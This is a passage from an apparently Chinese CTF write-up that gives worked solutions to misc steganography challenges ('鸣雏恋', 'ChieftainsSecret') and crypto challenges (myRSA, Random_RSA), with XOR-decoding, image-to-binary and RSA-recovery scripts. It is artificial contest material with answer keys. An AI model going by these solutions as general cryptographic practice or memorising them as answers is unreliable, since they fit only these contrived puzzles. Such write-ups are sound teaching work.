105, 115, 135, 105,  95, 107, 101, 121,   116, 104,   6, 122,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   107,  97, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115, 255, 105,  95, 107, 109, 121,   116, 104, 193, 123,  95,  97,  81, 107, 101, 121,   248,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   107,  97, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104,  46, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    57,  17,  73,  21,  45,   8,  58,   5,   1,  85,    84,  33,  73,   0,  62,   8,  59,  71,  69,  13,    28,  13,  27,  22, 127,   8,  44,  75,  23,  28,    21,   4,   5,  10, 127,  15,  48,  75,   3,  21,    21,  15,  73,  27,  58,  19,  58,  71,  69,  14,    28,  17,  73,  23,  48,  15, 205,  31,  69,   0,    27,  29,  73,  17,  58,  13,  54,  14,  19,  28,    84,   5,  12,  76,  82,  77, 114,  34,  83,  61,    93,   8,   5,  23,  60,  40,  21, 109,  72,  81,    51,  99,  34,  50,  19,  43,   9, 126,  42,  49,    61,  35,  32,  60,  16,  46,  19, 114, 122,  96,   106,  33, 117, 102,  71, 116,  17,  37, 122,  53,   108, 112, 116, 111,  64,  40,  65, 118, 101, 122,   116, 104,  34, 112,  95,  97, 217, 104, 101, 121,   178, 107, 105, 115,  95, 159, 161, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  93,  30, 100, 122,   116, 107, 105, 115,  20,  98,  95, 107, 155, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 100, 121,   116, 105, 103, 115,  80,  97,  87, 107, 100, 121,    63, 104, 102, 115,  95,  97,  95, 107,  89, 121,   116,  40, 152, 140,  93,  97,  99, 107,  99,  55,    27,  26,   4,  18,  51,  97, 126, 107, 101, 121,   123, 117, 105, 122, 191,  96, 159, 104, 197, 124,   244, 111,   9, 122,  31, 106, 127, 102, 101, 118,   148, 120, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 111, 115,   2,  98,  95,  10, 108, 125,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  71, 121,    53,  40, 155, 140, 254,  97, 125, 107, 115,  61,    17,  14,   8,   6,  51,  21, 127,  59,   4,  11,    21,  15,  27,  18,  47,   9, 127,  45,  10,  23,     0, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  20, 107, 101, 121,   119, 104, 150, 140, 160, 158,  92, 107, 154, 134,   139, 151, 104, 115,  91,  65, 160, 148, 100, 121,   116, 104, 105, 115,  20,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  46, 121,   116, 104, 105, 112, 159,  64,  56, 105, 101, 122,   116, 104, 175, 112,  95,  97,  93, 107, 101, 122,   116, 104,  34, 112,  95,  97,  92, 107,  34, 121,   119,  17,   0,  29,  84,  34, 101,  55,   3,  72,    64,  15,  71,  23,  48,  21,  92,  18,  12,  23,    68,  43,  83,  47,   8,  40,  17,  37,  49,  37,    36,  26,   6,  21,  54,  13,  58,  24,  57,  56,    16,   5,   0,  29,  54,  18,  43,  25,   4,  13,    27,  26,  53,  55,  58,  18,  52,  31,  10,   9,    40,  14,  88,  71,  56,  79,  59,   4,  17, 134,   117, 105, 105,  38, 114,  97,  95, 107, 101, 134,   139, 104, 105, 115,  95,  33,  95, 107, 101, 127,   116, 104, 105, 245,  92,  97,  95, 123, 108, 121,   112,  14,  88,  71,  56,  96,  95, 122, 100, 121,   116, 104, 109,  53, 110,  85,  24, 107,  37, 120,   244, 105, 105,  76,  95,  97,  95,  84, 101, 121,   116,  96, 105, 114,  95,  96,  95,  84, 101, 121,   116, 104, 105, 115,  95,  94,  95, 107, 101, 120,   113, 104,  60, 242,  60,  89,  95, 105, 121, 121,   116, 104, 105, 115,  95,  97,  21, 107, 101, 121,    63, 104, 105, 115, 111,  97,  95, 104, 101, 121,   117, 104,  89, 115,  21,  98,  95, 107, 101, 121,    55, 104, 124, 101, 207,  96,  95, 107,  49,  16,    25,  13,  26,  83,  17,   4,  40,  75,  55,  22,    25,   9,   7, 115,  83, 119, 207, 106, 103, 121,    39,  17,   4,  17,  48,  13,  95,  96,  67, 233,   117, 104, 105,  50,  45,   8,  62,   7, 101, 104,    65, 248, 104, 115,  95,  34,  48,  30,  23,  16,    17,  26,  73,  61,  58,  22,  95,  73, 101, 125,   116,  89,  97, 251,  71,  97,  95, 187, 103, 121,   116,   0, 104, 115,  95,  97,  95, 207, 233, 238,   179, 192, 229, 228, 152,  97,  95, 107, 101, 127,   116, 107, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 125,   116, 235, 121, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101,  93,   119, 104, 105, 115,  95, 126,  95, 107, 101, 113,    39,  29,  11,  83,  18,  32,  22,  37, 101, 121,   116, 104, 106,  10,  54,  15,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97&#125;;  size_t size &#x3D; 0x2E00;  for ( j &#x3D; 0; j &lt; (int)size; ++j )    data[j] ^&#x3D; key[j % 10];  v4 &#x3D; fopen(&quot;daidai&quot;, &quot;wb+&quot;);  fwrite(data, size, 1u, v4);  return 0;&#125;</code></pre><p>得到的文件是一个 Word 6.0 文件，打开后提示<br>My friend, I said, there is really no flag here, why don’t you believe me?</p><p>找到字符串 ，发现附近比较可疑</p><p>对全部内容进行xor，可找到完整flag</p><h3 id="鸣雏恋"><a href="#鸣雏恋" class="headerlink" title="鸣雏恋"></a>鸣雏恋</h3><p>binwalk提取doc文件，有一个压缩包，找到key里面有线索，是零宽字节，解出密码。</p><p>压缩包还有一个压缩包，用密码解压得十二万个图片，可以猜想为二进制即01或者黑白，用脚本转换为了二进制得flag。</p><pre class="language-python" data-language="python"><code class="language-python">white <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\0.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\1.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#注意要填文件真实的地址</span>flag <span class="token operator">=</span> <span class="token string">''</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">129488</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    color <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\Administrator\Desktop\鸣雏恋_2dad763070b79f50c4635a906359909a\鸣雏恋\_rels\love\out\%d.png'</span><span class="token operator">%</span>i<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>color <span class="token operator">==</span> white<span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token string">'0'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token string">'1'</span><span class="token comment">#把二进制数转为字符串</span>ans <span class="token operator">=</span> <span class="token string">''</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span></code></pre><p>输出得二进制字符串</p><p>转字符串</p><p>根据提示，base64转hex，另存为png</p><p>得到flag</p><h3 id="ChieftainsSecret"><a href="#ChieftainsSecret" class="headerlink" title="ChieftainsSecret"></a>ChieftainsSecret</h3><p>binwalk 出一个压缩包</p><p>得到一张图片和一个csv TLE5501角度传感器，可以看到接口的对应关系通过 pc1-pc2 pc3-pc4  算出具体角度最后通过角度偏移得到打电话的数字</p><p>77085962457</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="myRSA"><a href="#myRSA" class="headerlink" title="myRSA"></a>myRSA</h3><p>等了一年终于连上了远程，直接拿flag</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">109291726712521562723217799066595465738514008562793813124735859077003607567378308344900227726005943523435691922275823930699185558905584992475684350943587216218159563567105178716429607251904576481331913955542279314418005710062312937628773101937560276030946008602896333498620895794065652328753887107382421236463</span><span class="token comment"># 发送b'\x01'的数据</span>m1 <span class="token operator">=</span> <span class="token number">9525397945159597083139236796554389057349388348561320860497256507608704178409073111423041648854415731502829246163813817887013295691211115103559158067048812940460342194773168560663306267552081548022969259450140126995928980812391022443278295051940120607312916391873625551459919069565401135463687861822761080960205441980160935262098587017605666572800848834634719283023350989003155672616785656418280486284252404327230995895334350449329496820373234495050858491300214136</span>flag <span class="token operator">=</span> <span class="token number">84714851061101551104842512208187516497690941059475723791750410942286241438698723551108297972855709502813510704312734246065654513821412192005193874395178433209848447807820345594430525933303605443157096791247595647420106894826618667916444279408290598367546651937728210043377385005880582654352783857030860269528710293017844982383988131043975713555798776601699577367436001411779466011751454954293920819863328114688953193568821221654373376635664655139419988801273771425680451278262871578890722408740436473781164730132065673797985283333324587469932990362283302547046173192527601753522974618089085155465973571933897481911626440582347862648387324192155488169555320343590638542052353093371100231443955010712018714258942911513526907631585015690345636535765895659959658571378505136</span>t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>m1<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment"># print(t)</span><span class="token keyword">while</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>    t <span class="token operator">=</span> t<span class="token operator">-</span><span class="token number">1</span>t2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>t<span class="token operator">*</span>t<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token punctuation">(</span>t<span class="token operator">+</span>t2<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>q <span class="token operator">=</span> n<span class="token operator">//</span>px <span class="token operator">=</span> p<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>q <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">+</span> q<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> y <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>p<span class="token operator">*</span>q <span class="token operator">+</span> p <span class="token operator">+</span> qc <span class="token operator">=</span> <span class="token punctuation">(</span>flag<span class="token operator">//</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/article/2021xyb/1629541706(1).png" class="" title="1629541706(1)" loading="lazy"><h3 id="Random-RSA"><a href="#Random-RSA" class="headerlink" title="Random_RSA"></a>Random_RSA</h3><p>懒得开虚拟机，python2没有密码库，所以上面是用python2跑出来的dp，下面解密用的python3。</p><p>ps:这个题好像必须得用python2跑dp，py3的MT算法似乎参数有点不同，跑出来的数据也不同。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># import random</span><span class="token comment"># import binascii</span><span class="token comment"># import os</span><span class="token comment"># tmp = [[58, 53, 122], [145, 124, 244], [5, 19, 192], [255, 23, 64], [57, 113, 194], [246, 205, 162], [112, 87, 95], [215, 147, 105], [16, 131, 38], [234, 36, 46], [68, 61, 146], [148, 61, 9], [139, 77, 32], [96, 56, 160], [121, 76, 17], [114, 246, 92], [178, 206, 60], [168, 147, 26], [168, 41, 68], [24, 93, 84], [175, 43, 88], [147, 97, 153], [42, 94, 45], [150, 103, 127], [68, 163, 62], [165, 37, 89], [219, 248, 59], [241, 182, 8], [140, 211, 146], [88, 226, 2], [48, 150, 56], [87, 109, 255], [227, 216, 65], [23, 190, 10], [5, 25, 64], [6, 12, 124], [53, 113, 124], [255, 192, 158], [61, 239, 5], [62, 108, 86], [123, 44, 64], [195, 192, 30], [30, 82, 95], [56, 178, 165], [68, 77, 239], [106, 247, 226], [17, 46, 114], [91, 71, 156], [157, 43, 182], [146, 6, 42], [148, 143, 161], [108, 33, 139], [139, 169, 157], [71, 140, 25], [28, 153, 26], [241, 221, 235], [28, 131, 141], [159, 111, 184], [47, 206, 11], [220, 152, 157], [41, 213, 97], [4, 220, 10], [77, 13, 248], [94, 140, 110], [25, 250, 226], [218, 102, 109], [189, 238, 66], [91, 18, 131], [23, 239, 190], [159, 33, 72], [183, 78, 208], [209, 213, 101], [111, 50, 220], [166, 104, 233], [170, 144, 10], [187, 87, 175], [195, 59, 104], [165, 179, 179], [99, 247, 153], [195, 61, 100], [223, 159, 165], [230, 93, 184], [87, 28, 35], [35, 122, 38], [158, 188, 163], [229, 192, 222], [12, 12, 192], [207, 95, 224], [127, 113, 137], [22, 114, 143], [13, 45, 144], [70, 140, 211], [57, 101, 42], [132, 62, 129], [40, 128, 124], [1, 132, 161], [164, 33, 133], [252, 201, 32], [8, 18, 247], [1, 88, 55], [201, 135, 186], [101, 254, 125], [236, 196, 39], [148, 24, 103], [101, 29, 253], [97, 156, 64], [90, 103, 91], [50, 48, 80], [206, 22, 93], [11, 114, 174], [61, 132, 247], [215, 32, 232], [95, 128, 90], [57, 35, 228], [163, 143, 107], [178, 250, 28], [64, 107, 225], [106, 115, 207], [85, 134, 21], [118, 201, 76], [234, 34, 22], [241, 236, 122], [111, 185, 127], [1, 26, 164], [254, 57, 117], [243, 27, 32], [161, 88, 80], [50, 165, 93], [87, 182, 216], [184, 159, 63], [167, 166, 123], [37, 78, 33], [186, 81, 58], [48, 3, 239], [70, 186, 13], [56, 108, 178], [54, 55, 235], [105, 180, 105], [16, 194, 98], [136, 11, 41], [18, 203, 79], [185, 114, 170], [148, 181, 223], [118, 57, 160], [23, 250, 181], [235, 219, 228], [44, 151, 38], [185, 224, 134], [42, 162, 122], [3, 9, 158], [129, 245, 2], [66, 241, 92], [80, 124, 36]]</span><span class="token comment"># res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]</span><span class="token comment"># seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]</span><span class="token comment"># dp = bytearray()</span><span class="token comment"># for i in range(0, len(seeds)):</span><span class="token comment">#     random.seed(seeds[i])</span><span class="token comment">#     rands = []</span><span class="token comment">#     for j in range(0,4):</span><span class="token comment">#         rands.append(random.randint(0,255))</span><span class="token comment">#     print(str(rands))</span><span class="token comment">#     dp.append(res[i] ^ rands[i%4])</span><span class="token comment"># print(dp)</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2dp <span class="token operator">=</span> <span class="token number">5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token 